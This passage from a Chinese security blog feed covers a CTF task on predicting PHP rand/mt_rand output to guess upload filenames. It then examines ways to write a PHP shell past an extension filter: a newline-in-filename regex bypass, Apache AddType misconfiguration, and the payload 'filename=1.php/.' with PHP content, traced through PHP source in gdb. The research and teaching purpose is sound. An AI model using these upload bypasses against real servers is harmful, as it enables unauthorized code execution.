class="line">session_start();</span><br><span class="line"></span><br><span class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">mt_srand($seed);</span><br><span class="line">$ss = mt_rand();</span><br><span class="line">$hash = md5(session_id() . $ss);</span><br><span class="line">setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们的目标是猜测出filename.<br>这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了.</p>
<h3 id="rand-函数的安全性问题"><a href="#rand-函数的安全性问题" class="headerlink" title="rand() 函数的安全性问题"></a>rand() 函数的安全性问题</h3><p>rand() 函数在产生随机数的时候没有调用 srand(),则产生的随机数是有规律可询的.<br>具体的说明请看这里<a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</a><br>产生的随机数可以用下面这个公式预测 : state[i] = state[i-3] + state[i-31] (一般预测值可能比实际值要差1)<br>写下面测试代码,验证一下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$randStr = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">50</span>;$i++)&#123;  <span class="comment">//先产生 32个随机数</span></span><br><span class="line">    $randStr[$i]=rand(<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>($i&gt;=<span class="number">31</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">"$randStr[$i]=("</span>.$randStr[$i<span class="number">-31</span>].<span class="string">"+"</span>.$randStr[$i<span class="number">-3</span>].<span class="string">") mod 31"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看一下结果:</p>
<img src="https://pic.wonderkun.cc/uploads/2017/03/7.png" alt="7" width="672" height="454" class="alignnone size-full wp-image-592" />

<p>发现预测的值,基本都是对的,这样就可以根据之前生成的随机数,预测之后产生的随机数.<br>因为这个缺陷,我还出过一个题目,题目在这里<a href="https://github.com/wonderkun/CTF_web/tree/master/web500-2" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/web500-2</a></p>
<p>writeup已经上传,想学习的,赶紧去看.</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>php_apache2_操作系统之间的一些黑魔法</title>
    <url>/2017/08/22/php_apache2_%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>做了一个CTF题目，遇到了一些有趣的东西，所以写了这篇文章记录了一下。 但是我却不明白造成这个问题的原因在哪里，所以不知道给文章起什么标题，就姑且叫这个非常宽泛的名字吧。</p>
<a id="more"></a>
<h3 id="0x01-CTF题目原型"><a href="#0x01-CTF题目原型" class="headerlink" title="0x01 CTF题目原型"></a>0x01 CTF题目原型</h3><p>在遇到的题目中，最后一步是getshell，大概可以简化为以下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试环境 linux + apache2  + php </span></span><br><span class="line"><span class="comment">// 没有开rewrite ，所以写 .htaccess 没用</span></span><br><span class="line"><span class="comment">// 没有用cgi ，所以写 .user.ini 也没有 </span></span><br><span class="line"><span class="comment">// 要求 getshell </span></span><br><span class="line"><span class="comment">// 修改配置文件，crontab之类的都是没权限的。 </span></span><br><span class="line">  </span><br><span class="line">$content = $_POST[<span class="string">'content'</span>]; </span><br><span class="line">$filename = $_POST[<span class="string">'filename'</span>]; </span><br><span class="line">$filename = <span class="string">"backup/"</span>.$filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">    fwrite($f, $content);</span><br><span class="line">    fclose($f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我把这个问题发到phithon的代码审计圈里征求答案，师傅们的答案都在理，但是却不是我想要的那个答案，下面就来一一的分析以下。</p>
<h3 id="0x02-一些不完美的做法"><a href="#0x02-一些不完美的做法" class="headerlink" title="0x02 一些不完美的做法"></a>0x02 一些不完美的做法</h3><p>我最开始的想法跟大多数师傅的想法一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">因为正则表达式中的点（.）不会匹配换行符（<span class="number">0x0a</span>），所以可以在扩展名前面插入一个换行符，构造的文件名为<span class="number">233</span>%<span class="number">0</span>a.php，</span><br><span class="line">这样就可以绕过正则，而且还是合法的文件名(linux允许这样的文件名存在，而windows是不允许的)。</span><br></pre></td></tr></table></figure>

<p>在我本地测试一下，一切都是那么的美好，轻松getshell:</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/08/1.png" alt="http://pic.wonderkun.cc/uploads/2017/08/1.png"></p>
<p>我本地的环境是 mac默认安装的apache+php。</p>
<p>当我在ubuntu上测试的时候傻眼了，</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/08/2.png" alt="http://pic.wonderkun.cc/uploads/2017/08/2.png"></p>
<p>ubuntu上的apache并没有把这个文件当做php文件来解析。这到底是为什么呢？这里先留个坑，一会仔细讲。</p>
<p>这种方法不行之后，很快就有人想到了，会不是是apache2的文件解析漏洞呢？然后我就在ubuntu上测试了一下</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/08/3.png" alt="http://pic.wonderkun.cc/uploads/2017/08/3.png"></p>
<p>apache的版本是2.4.7，并不存在解析漏洞。</p>
<p>然后我又在本地测试了一下。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/08/4.png" alt="http://pic.wonderkun.cc/uploads/2017/08/4.png"></p>
<p><strong>What fuck!!!</strong>  我的本地竟然存在php文件解析漏洞，这笔记本是假的吧，装的apache也是假的吧。版本都是2.4.25了怎么还会存在文件解析漏洞呢？ </p>
<p><strong>在我的印象中apache的文件解析漏洞是在2.3.x以下版本才会存在的啊？这到底是为什么？</strong></p>
<p>之后朋友又给我发来了一张图片，我当时就炸毛了，他的版本是2.4.18，并不存在漏洞。我觉得我这apache可能是假的。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/08/5.png" alt="http://pic.wonderkun.cc/uploads/2017/08/5.png"></p>
<p>经过冷静的思考，我得出结论：<strong>Apache文件解析漏洞，可能与apache的版本并没有关系，而是与apache解析php的配置相关。</strong></p>
<h3 id="0x03-再提apache的文件解析漏洞"><a href="#0x03-再提apache的文件解析漏洞" class="headerlink" title="0x03 再提apache的文件解析漏洞"></a>0x03 再提apache的文件解析漏洞</h3><p>apache的文件解析漏洞正火的时候，我还没上大学呢，所以也没有真正的去分析产生这种漏洞的原因，一直模糊的认为这是apache本身的问题：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。 </p>
<p>所以我以为apache后来已经修复了这个bug了，不会再出现文件解析漏洞了。</p>
<p>经过比对，我发现我本地mac上的php5.conf是这样写的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ cat /private/etc/apache2/other/php5.conf</span><br><span class="line">&lt;IfModule php5_module&gt;</span><br><span class="line">	AddType application/x-httpd-php .php</span><br><span class="line">	AddType application/x-httpd-php-source .php</span><br><span class="line">	&lt;IfModule dir_module&gt;</span><br><span class="line">		DirectoryIndex index.html index.php</span><br><span class="line">	&lt;/IfModule&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>而ubuntu上的php5.conf是这样的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">".+\.ph(p[345]?|t|tml)$"</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;FilesMatch <span class="string">".+\.phps$"</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment"># Deny access to files without filename (e.g. '.php')</span></span><br><span class="line">&lt;FilesMatch <span class="string">"^\.ph(p[345]?|t|tml|ps)$"</span>&gt;</span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>看ubuntu的配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">".+\.ph(p[345]?|t|tml)$"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>这个正则和题目中的正则是一样的，很容易明白，当文件名和这个正则匹配上之后，就交给mod_php处理。</p>
<p>这就解释了为什么<code>233%0a.php</code>不会被解析的。</p>
<p>还有下面这段,也禁止解析以<code>.</code>开头的php文件执行的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"^\.ph(p[345]?|t|tml|ps)$"</span>&gt;</span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>所以我觉得产生文件解析漏洞的根源是这句话：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>

<p>为了验证我的想法，我把这句修改为下面这样，然后重启apache</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .phtml</span><br></pre></td></tr></table></figure>

<p><img src="http://pic.wonderkun.cc/uploads/2017/08/6.png" alt="http://pic.wonderkun.cc/uploads/2017/08/6.png"></p>
<p>在这种情况下.php后缀已经不再被解析了，而被解析的是.phtml和.phtml.xxxxxxx</p>
<p>所以这样的错误配置才是引起apache 解析漏洞的关键。</p>
<p>最后感悟：无论是apache文件解析漏洞还是nginx文件解析漏洞，本来都不应该是apache，nginx 或者php的锅，它们有的只是功能，而且开发这些功能也是为了方便使用者，而恰好这些功能恰好被一个管理员用在了不恰当的时候，所以才造成了漏洞。</p>
<h3 id="0x04-回到题目中"><a href="#0x04-回到题目中" class="headerlink" title="0x04 回到题目中"></a>0x04 回到题目中</h3><p> 经过测试发现一个可以再windows和linux上都行得通的方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filename=1.php/.&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>在操作系统中，都是禁止使用<code>/</code>作为文件名的，但是不知道为什么后面加一个<code>.</code>就可以成功的写入1.php了。</p>
<p>而且奇怪的是无论是在windows上还是linux上，每次都只可以创建新文件，不能覆盖老文件。要想知道php里面是怎么处理这个路径的，就需要看php源代码了，但是我目前并没有看明白里面的处理逻辑，等我抽个时间分析完了，再做补充吧。</p>
<h3 id="0x5-问题成因分析"><a href="#0x5-问题成因分析" class="headerlink" title="0x5 问题成因分析"></a>0x5 问题成因分析</h3><p>经过了一段时间的分析，我终于找到了php在文件路径处理上的问题所在。</p>
<p>由于我对php源码不太熟悉，分析过程踩了一些坑，下面记录一下分析过程。</p>
<p>我用的是<code>php5.6.8</code>版本记进行分析的，源码可以直接从<code>https://github.com/php/php-src</code>下载，然后checkout出<code>php5.6.8</code>版本即可。对于编译过程不再详说，为了方便分析，建议修改<code>MakeFile：58</code>行为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CFLAGS_CLEAN = -g -O0 -fvisibility=hidden  <span class="comment">//去掉优化编译选项</span></span><br></pre></td></tr></table></figure>

<p>现在php源码全局搜索找出<code>file_put_contents</code>函数的实现入口，在<code>ext/standard/file.c</code>的579行，发现了下面代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PHP_FUNCTION(file_put_contents)  </span><br><span class="line">&#123;</span><br><span class="line">	.....</span><br></pre></td></tr></table></figure>

<p>这就是<code>file_put_contents</code>函数的入口，在这里下一个断点，然后执行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  cli git:(php-5.6.8) ✗ gdb -q ./php</span><br><span class="line">Reading symbols from ./php...done.</span><br><span class="line">gdb-peda$ b  ext/standard/file.c:579</span><br><span class="line">Breakpoint 1 at 0x10012b3ce: file ext/standard/file.c, line 579.</span><br><span class="line">gdb-peda$ r ~/Desktop/2.php</span><br><span class="line">Starting program: /Users/wonderkun/script/php-src/sapi/cli/php ~/Desktop/2.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#2.php 的内容如下</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">"./test.php/."</span>,<span class="string">"&lt;?=phpinfo()=&gt;"</span>);</span><br></pre></td></tr></table></figure>

<p>跟踪到file.c:616行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, mode, ((flags &amp; PHP_FILE_USE_INCLUDE_PATH) ? USE_PATH : <span class="number">0</span>) | REPORT_ERRORS, <span class="literal">NULL</span>, context);</span><br><span class="line"><span class="comment">//调用php_stream_open_wrapper_ex进行了写文件处理</span></span><br></pre></td></tr></table></figure>

<p>单步跟进次函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line">_php_stream_open_wrapper_ex (path=0x1012181d8 <span class="string">"./test.php/."</span>, mode=0x7fff5fbfdf2d <span class="string">"wb"</span>, options=0x8, opened_path=0x0, context=0x1006d0520) at main/streams/streams.c:2022</span><br><span class="line">2022		php_stream *stream = NULL;</span><br></pre></td></tr></table></figure>

<p>在<code>/main/stream/stream.c:2022</code>行找到了次函数的实现。</p>
<p>跟踪到<code>/main/stream/stream.c:2064</code>行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">stream = wrapper-&gt;wops-&gt;stream_opener(wrapper,</span><br><span class="line">				path_to_open, mode, options ^ REPORT_ERRORS,</span><br><span class="line">				opened_path, context STREAMS_REL_CC TSRMLS_CC);</span><br></pre></td></tr></table></figure>

<p>跟进此函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line">php_plain_files_stream_opener (wrapper=0x1004ae498, path=0x1012181d8 <span class="string">"./test.php/."</span>, mode=0x7fff5fbfdf2d <span class="string">"wb"</span>, options=0x0, opened_path=0x0, context=0x1006d0520)</span><br><span class="line">    at main/streams/plain_wrapper.c:1020</span><br><span class="line">1020		<span class="keyword">if</span> (((options &amp; STREAM_DISABLE_OPEN_BASEDIR) == 0) &amp;&amp; php_check_open_basedir(path TSRMLS_CC)) &#123;</span><br></pre></td></tr></table></figure>

<p>在<code>main/streams/plain_wrapper.c:1020</code>，找到此函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> php_stream *<span class="title">php_plain_files_stream_opener</span><span class="params">(php_stream_wrapper *wrapper, <span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *mode,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">int</span> options, <span class="keyword">char</span> **opened_path, php_stream_context *context STREAMS_DC TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (((options &amp; STREAM_DISABLE_OPEN_BASEDIR) == <span class="number">0</span>) &amp;&amp; php_check_open_basedir(path TSRMLS_CC)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> php_stream_fopen_rel(path, mode, opened_path, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进 <code>php_stream_fopen_rel</code>函数，在main/streams/plain_wrapper.c的1024行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line">_php_stream_fopen (filename=0x1012181d8 <span class="string">"./test.php/."</span>, mode=0x7fff5fbfdf2d <span class="string">"wb"</span>, opened_path=0x0, options=0x0) at main/streams/plain_wrapper.c:920</span><br><span class="line">920		char *realpath = NULL;</span><br></pre></td></tr></table></figure>

<p>跟进到<code>main/streams/plain_wrapper.c:937</code>，进入函数<code>expand_filepath(filename, NULL TSRMLS_CC)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line">expand_filepath (filepath=0x1012181d8 <span class="string">"./test.php/."</span>, real_path=0x0) at main/fopen_wrappers.c:732</span><br><span class="line">732		<span class="built_in">return</span> expand_filepath_ex(filepath, real_path, NULL, 0 TSRMLS_CC);</span><br></pre></td></tr></table></figure>

<p>在<code>main/fopen_wrappers.c:732</code>行，看到函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> expand_filepath_ex(filepath, real_path, <span class="literal">NULL</span>, <span class="number">0</span> TSRMLS_CC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟踪函数<code>expand_filepath_ex</code>,在<code>main/fopen_wrappers.c:738</code>行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">char</span> *<span class="title">expand_filepath_ex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filepath, <span class="keyword">char</span> *real_path, <span class="keyword">const</span> <span class="keyword">char</span> *relative_to, <span class="keyword">size_t</span> relative_to_len TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> expand_filepath_with_mode(filepath, real_path, relative_to, relative_to_len, CWD_FILEPATH TSRMLS_CC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟踪函数<code>expand_filepath_with_mode</code>,在<code>main/fopen_wrappers.c:746</code>行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line">expand_filepath_with_mode (filepath=0x1012181d8 <span class="string">"./test.php/."</span>, real_path=0x0, relative_to=0x0, relative_to_len=0x0, realpath_mode=0x1) at main/fopen_wrappers.c:752</span><br><span class="line">752		<span class="keyword">if</span> (!filepath[0]) &#123;</span><br></pre></td></tr></table></figure>

<p>执行到<code>main/fopen_wrappers.c:797</code>行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (virtual_file_ex(&amp;new_state, filepath, <span class="literal">NULL</span>, realpath_mode TSRMLS_CC)) &#123;</span><br><span class="line">	efree(new_state.cwd);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>virtual_file_ex</code>函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line">virtual_file_ex (state=0x7fff5fbfd800, path=0x1012181d8 <span class="string">"./test.php/."</span>, verify_path=0x0, use_realpath=0x1) at Zend/zend_virtual_cwd.c:1181</span><br><span class="line">1181		int path_length = strlen(path);</span><br></pre></td></tr></table></figure>

<p>继续向下执行，读代码可以发现结构体state中存储着要被写入的文件的路径，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p *state</span><br><span class="line"><span class="variable">$6</span> = &#123;</span><br><span class="line">  cwd = 0x1006d0958 <span class="string">"/Users/wonderkun/script/php-src/sapi/cli"</span>,</span><br><span class="line">  cwd_length = 0x28</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>Zend/zend_virtual_cwd.c：1320</code>行,代码如下，修改了path_length,之后把path_length赋值给了state.cwd_length,所以<code>tsrm_realpath_r</code>一定是对路径做处理的函数，是这个问题的关键。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, <span class="number">0</span>, <span class="literal">NULL</span> TSRMLS_CC);</span><br></pre></td></tr></table></figure>

<p>跟进此函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line">tsrm_realpath_r (path=0x7fff5fbfd370 <span class="string">"/Users/wonderkun/script/php-src/sapi/cli/./test.php/."</span>, start=0x1, len=0x35, ll=0x7fff5fbfd340, t=0x7fff5fbfd338, use_realpath=0x1,</span><br><span class="line">    is_dir=0x0, link_is_dir=0x0) at Zend/zend_virtual_cwd.c:781</span><br></pre></td></tr></table></figure>

<p>从最开始的函数入口，到找到问题存在的函数，整个调用栈是这样的，方便大家看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line"><span class="comment">#0  tsrm_realpath_r (path=0x7fff5fbfd370 "/Users/wonderkun/script/php-src/sapi/cli/./test.php/.", start=0x1, len=0x35, ll=0x7fff5fbfd340, t=0x7fff5fbfd338, use_realpath=0x1,</span></span><br><span class="line">    is_dir=0x0, link_is_dir=0x0) at Zend/zend_virtual_cwd.c:794</span><br><span class="line"><span class="comment">#1  0x000000010028c615 in virtual_file_ex (state=0x7fff5fbfd800, path=0x1012181d8 "./test.php/.", verify_path=0x0, use_realpath=0x1) at Zend/zend_virtual_cwd.c:1320</span></span><br><span class="line"><span class="comment">#2  0x00000001001c1e9e in expand_filepath_with_mode (filepath=0x1012181d8 "./test.php/.", real_path=0x0, relative_to=0x0, relative_to_len=0x0, realpath_mode=0x1)</span></span><br><span class="line">    at main/fopen_wrappers.c:797</span><br><span class="line"><span class="comment">#3  0x00000001001c1bc3 in expand_filepath_ex (filepath=0x1012181d8 "./test.php/.", real_path=0x0, relative_to=0x0, relative_to_len=0x0) at main/fopen_wrappers.c:740</span></span><br><span class="line"><span class="comment">#4  0x00000001001c0364 in expand_filepath (filepath=0x1012181d8 "./test.php/.", real_path=0x0) at main/fopen_wrappers.c:732</span></span><br><span class="line"><span class="comment">#5  0x00000001001e1c8a in _php_stream_fopen (filename=0x1012181d8 "./test.php/.", mode=0x7fff5fbfdf2d "wb", opened_path=0x0, options=0x0) at main/streams/plain_wrapper.c:937</span></span><br><span class="line"><span class="comment">#6  0x00000001001e25f4 in php_plain_files_stream_opener (wrapper=0x1004ae498, path=0x1012181d8 "./test.php/.", mode=0x7fff5fbfdf2d "wb", options=0x0, opened_path=0x0,</span></span><br><span class="line">    context=0x1006d0520) at main/streams/plain_wrapper.c:1024</span><br><span class="line"><span class="comment">#7  0x00000001001dbb12 in _php_stream_open_wrapper_ex (path=0x1012181d8 "./test.php/.", mode=0x7fff5fbfdf2d "wb", options=0x8, opened_path=0x0, context=0x1006d0520)</span></span><br><span class="line">    at main/streams/streams.c:2064</span><br><span class="line"><span class="comment">#8  0x000000010012b6e5 in zif_file_put_contents (ht=0x2, return_value=0x1006d0848, return_value_ptr=0x10069b160, this_ptr=0x0, return_value_used=0x0) at ext/standard/file.c:616</span></span><br><span class="line"><span class="comment">#9  0x000000010034a8bc in zend_do_fcall_common_helper_SPEC (execute_data=0x10069b178) at Zend/zend_vm_execute.h:558</span></span><br><span class="line"><span class="comment">#10 0x00000001002d32f7 in ZEND_DO_FCALL_SPEC_CONST_HANDLER (execute_data=0x10069b178) at Zend/zend_vm_execute.h:2599</span></span><br><span class="line"><span class="comment">#11 0x000000010029eadf in execute_ex (execute_data=0x10069b178) at Zend/zend_vm_execute.h:363</span></span><br><span class="line"><span class="comment">#12 0x000000010029f53e in zend_execute (op_array=0x1006cf438) at Zend/zend_vm_execute.h:388</span></span><br><span class="line"><span class="comment">#13 0x0000000100257838 in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3) at Zend/zend.c:1341</span></span><br><span class="line"><span class="comment">#14 0x00000001001b73af in php_execute_script (primary_file=0x7fff5fbff230) at main/main.c:2597</span></span><br><span class="line"><span class="comment">#15 0x0000000100396835 in do_cli (argc=0x2, argv=0x7fff5fbff948) at sapi/cli/php_cli.c:994</span></span><br><span class="line"><span class="comment">#16 0x0000000100395737 in main (argc=0x2, argv=0x7fff5fbff948) at sapi/cli/php_cli.c:1378</span></span><br></pre></td></tr></table></figure>

<p><code>tsrm_realpath_r</code>函数中存在递归，所以完全理解起来还是比较复杂的，但是只需要看懂其中的一层，就可以理解其他的部分了，看如下关键代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i = len;  </span><br><span class="line">     <span class="comment">// i的初始值为字符串的长度</span></span><br><span class="line"><span class="keyword">while</span> (i &gt; start &amp;&amp; !IS_SLASH(path[i<span class="number">-1</span>])) &#123;</span><br><span class="line">	i--;   </span><br><span class="line">        <span class="comment">// 把i定位到第一个/的后面</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == len ||</span><br><span class="line">	(i == len - <span class="number">1</span> &amp;&amp; path[i] == <span class="string">'.'</span>)) &#123;</span><br><span class="line">	len = i - <span class="number">1</span>;  </span><br><span class="line">         <span class="comment">//  删除路径中最后的 /. , 也就是 /path/test.php/. 会变为 /path/test.php  </span></span><br><span class="line">	is_dir = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == len - <span class="number">2</span> &amp;&amp; path[i] == <span class="string">'.'</span> &amp;&amp; path[i+<span class="number">1</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">	<span class="comment">//删除路径结尾的 /.. </span></span><br><span class="line">	is_dir = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (link_is_dir) &#123;</span><br><span class="line">		*link_is_dir = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (i - <span class="number">1</span> &lt;= start) &#123;</span><br><span class="line">		<span class="keyword">return</span> start ? start : len;</span><br><span class="line">	&#125;</span><br><span class="line">	j = tsrm_realpath_r(path, start, i<span class="number">-1</span>, ll, t, use_realpath, <span class="number">1</span>, <span class="literal">NULL</span> TSRMLS_CC);</span><br><span class="line">   <span class="comment">// 进行递归调用的时候，这里把strlen设置为了i-1，</span></span><br></pre></td></tr></table></figure>

<p>可以看出在做路径处理的时候，会递归的删除掉路径中存在的<code>/.</code>,所以导致写入文件成功。但是为什么不能覆盖老文件呢？</p>
<p>还要多谢@yihchin大牛帮我分析，看Zend/zend_virtual_cwd.c文件的两段代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1077</span> <span class="keyword">if</span> (save &amp;&amp; php_sys_lstat(path, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">1078</span>			<span class="keyword">if</span> (use_realpath == CWD_REALPATH) &#123;</span><br><span class="line"><span class="number">1079</span>				<span class="comment">/* file not found */</span></span><br><span class="line"><span class="number">1080</span>				<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="number">1081</span>			&#125;</span><br><span class="line"><span class="number">1082</span>			<span class="comment">/* continue resolution anyway but don't save result in the cache */</span></span><br><span class="line"><span class="number">1083</span>			save = <span class="number">0</span>;</span><br><span class="line"><span class="number">1084</span>		&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1120</span> <span class="keyword">if</span> (save) &#123;</span><br><span class="line"><span class="number">1121</span>				directory = S_ISDIR(st.st_mode);</span><br><span class="line"><span class="number">1122</span>				<span class="keyword">if</span> (link_is_dir) &#123;</span><br><span class="line"><span class="number">1123</span>					*link_is_dir = directory;</span><br><span class="line"><span class="number">1124</span>				&#125;</span><br><span class="line"><span class="number">1125</span>				<span class="keyword">if</span> (is_dir &amp;&amp; !directory) &#123;</span><br><span class="line"><span class="number">1125</span>					<span class="comment">/* not a directory */</span></span><br><span class="line"><span class="number">1127</span>					free_alloca(tmp, use_heap);</span><br><span class="line"><span class="number">1128</span>					<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="number">1129</span>				&#125;</span><br><span class="line"><span class="number">1130</span>			&#125;</span><br></pre></td></tr></table></figure>

